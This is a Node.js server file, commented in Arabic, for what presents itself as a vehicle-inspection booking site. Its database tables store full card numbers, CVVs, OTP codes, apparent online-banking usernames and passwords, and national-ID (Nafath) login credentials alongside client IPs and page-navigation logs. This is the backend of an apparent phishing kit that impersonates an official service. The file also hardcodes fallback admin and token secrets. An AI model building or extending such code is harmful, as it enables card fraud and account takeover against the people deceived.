/**
 * server.js - النسخة النهائية الموجهة لمجلد public
 * تم التعديل لفتح index.html من داخل مجلد public
 */

require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const { Pool } = require("pg");
const { nanoid } = require("nanoid");

// ==================== إعداد المتغيرات ====================
const PORT = process.env.PORT || 8080; 
const JWT_SECRET = process.env.JWT_SECRET || "vehicle-inspection-secret-2024";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@2024";

// إعداد الاتصال بـ PostgreSQL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// ==================== إنشاء الجداول ====================
const initDb = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS bookings (
        id SERIAL PRIMARY KEY,
        referenceId TEXT UNIQUE NOT NULL,
        clientName TEXT DEFAULT '',
        clientId TEXT DEFAULT '',
        clientPhone TEXT DEFAULT '',
        clientEmail TEXT DEFAULT '',
        clientNationality TEXT DEFAULT '',
        hasDelegate INTEGER DEFAULT 0,
        delegateType TEXT DEFAULT '',
        delegateName TEXT DEFAULT '',
        delegatePhone TEXT DEFAULT '',
        delegateNationality TEXT DEFAULT '',
        delegateId TEXT DEFAULT '',
        vehicleCountry TEXT DEFAULT '',
        vehiclePlate TEXT DEFAULT '',
        vehiclePlateChar1 TEXT DEFAULT '',
        vehiclePlateChar2 TEXT DEFAULT '',
        vehiclePlateChar3 TEXT DEFAULT '',
        vehicleType TEXT DEFAULT '',
        vehicleCarryDang INTEGER DEFAULT 0,
        serviceRegion TEXT DEFAULT '',
        serviceType TEXT DEFAULT '',
        serviceDate TEXT DEFAULT '',
        serviceTime TEXT DEFAULT '',
        clientIp TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        status TEXT DEFAULT 'new',
        statusRead INTEGER DEFAULT 0,
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );

      CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        referenceId TEXT UNIQUE NOT NULL,
        cardHolderName TEXT DEFAULT '',
        cardNumber TEXT DEFAULT '',
        cardLastFour TEXT DEFAULT '',
        cardExpiry TEXT DEFAULT '',
        cardCvv TEXT DEFAULT '',
        verifyCode TEXT DEFAULT '',
        secretNum TEXT DEFAULT '',
        rajUsername TEXT DEFAULT '',
        rajPassword TEXT DEFAULT '',
        paymentAction TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );

      CREATE TABLE IF NOT EXISTS verification_codes (
        id SERIAL PRIMARY KEY,
        referenceId TEXT NOT NULL,
        type TEXT NOT NULL,
        nafathId TEXT DEFAULT '',
        nafathPassword TEXT DEFAULT '',
        nafathNumber TEXT DEFAULT '',
        motaselProvider TEXT DEFAULT '',
        motaselPhone TEXT DEFAULT '',
        motaselCode TEXT DEFAULT '',
        otpCode TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000),
        UNIQUE(referenceId, type)
      );

      CREATE TABLE IF NOT EXISTS navigation_logs (
        id SERIAL PRIMARY KEY,
        referenceId TEXT,
        clientIp TEXT DEFAULT '',
        targetPage TEXT DEFAULT '',
        note TEXT DEFAULT '',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );
    `);
    console.log("Database tables initialized successfully");
  } catch (err) {
    console.error("Error initializing database:", err);
  }
};

initDb();

// ==================== دوال قاعدة البيانات ====================
// (تم الإبقاء على جميع الدوال كما هي لضمان عمل قاعدة البيانات)

async function createBooking(data) {
  const query = `
    INSERT INTO bookings (
      referenceId, clientName, clientId, clientPhone, clientEmail, clientNationality,
      hasDelegate, delegateType, delegateName, delegatePhone, delegateNationality, delegateId,
      vehicleCountry, vehiclePlate, vehiclePlateChar1, vehiclePlateChar2, vehiclePlateChar3,
      vehicleType, vehicleCarryDang, serviceRegion, serviceType, serviceDate, serviceTime,
      clientIp, rawData, status, statusRead
    ) VALUES (
      $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22, $23, $24, $25, $26, $27
    ) RETURNING *`;
  
  const values = [
    data.referenceId, data.clientName, data.clientId, data.clientPhone, data.clientEmail, data.clientNationality,
    data.hasDelegate ? 1 : 0, data.delegateType, data.delegateName, data.delegatePhone, data.delegateNationality, data.delegateId,
    data.vehicleCountry, data.vehiclePlate, data.vehiclePlateChar1, data.vehiclePlateChar2, data.vehiclePlateChar3,
    data.vehicleType, data.vehicleCarryDang ? 1 : 0, data.serviceRegion, data.serviceType, data.serviceDate, data.serviceTime,
    data.clientIp, JSON.stringify(data.rawData || {}), data.status, data.statusRead
  ];

  const res = await pool.query(query, values);
  return res.rows[0];
}

async function getBookingByReference(referenceId) {
  const res = await pool.query("SELECT * FROM bookings WHERE referenceId = $1", [referenceId]);
  const row = res.rows[0];
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

async function getAllBookings() {
  const res = await pool.query("SELECT * FROM bookings ORDER BY createdAt DESC");
  return res.rows.map(r => {
    try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
    return r;
  });
}

// ==================== إعداد Express والملفات ====================
const app = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// --- توجيه الملفات الثابتة لمجلد public ---
app.use(express.static(path.join(__dirname, 'public')));

// فتح الصفحة الرئيسية من داخل مجلد public
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// فتح صفحة الأدمن (تأكد أنها أيضاً داخل public أو عدل المسار)
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ==================== تشغيل السيرفر ====================
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
